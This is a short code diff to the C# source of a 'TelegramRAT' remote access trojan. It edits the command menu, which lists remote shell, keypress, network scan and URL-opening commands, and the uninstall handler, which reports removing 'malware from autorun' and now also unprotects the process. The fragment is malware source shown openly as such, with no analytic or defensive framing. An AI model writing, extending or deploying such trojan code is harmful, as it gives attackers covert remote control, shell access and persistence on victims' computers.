@@ -106,7 +106,7 @@ namespace TelegramRAT
                             "\n🚀 COMMUNICATION:" +
                             "\n /Speak <text>" +
                             "\n /Shell <command>" +
-                            "\n /MessageBox <error/info/warn> <text>" +
+                            "\n /MessageBox <error/info/warn> <text> <caption>" +
                             "\n /OpenURL <url>" +
                             "\n /SendKeyPress <keys>" +
                             "\n /ScanNetwork <to>" +
@@ -1129,6 +1129,7 @@ namespace TelegramRAT
                 case "UNINSTALL":
                     {
                         telegram.sendText("💉 Uninstalling malware from autorun...");
+                        persistense.unprotectProcess();
                         persistense.delAutorun();
                         Thread.Sleep(2000);
                         Environment.Exit(0);
